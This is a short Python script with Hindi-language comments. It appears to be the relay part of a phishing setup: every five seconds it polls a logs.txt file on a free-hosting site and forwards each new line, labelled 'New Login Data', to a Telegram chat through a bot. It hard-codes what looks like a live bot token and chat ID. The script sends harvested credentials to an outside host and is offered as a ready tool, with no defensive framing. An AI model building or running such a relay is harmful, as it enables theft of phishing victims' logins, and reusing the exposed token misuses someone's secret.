import requests
import time

# === SETTINGS ===
BOT_TOKEN = "8465200906:AAFF4uvA7LWbdRK5-5tZ05jX5uUc3fYUrRw"      # @BotFather se milega
CHAT_ID = "7924753922"          # @userinfobot se milega
LOG_URL = "https://your-site.infinityfreeapp.com/logs.txt"  # Apni InfinityFree site ka link

# === LOGIC ===
last_line = ""

while True:
    try:
        r = requests.get(LOG_URL, timeout=10)
        if r.status_code == 200:
            lines = r.text.strip().split('\n')
            if lines:
                latest = lines[-1]  # Sirf last line (naya data)
                
                if latest != last_line and latest != "":
                    last_line = latest
                    
                    # Telegram par message bhejo
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                    data = {"chat_id": CHAT_ID, "text": f"🆕 New Login Data:\n{latest}"}
                    requests.post(url, data=data)
    except Exception as e:
        print("Error:", e)
    
    time.sleep(5)  # Har 5 second mein check karega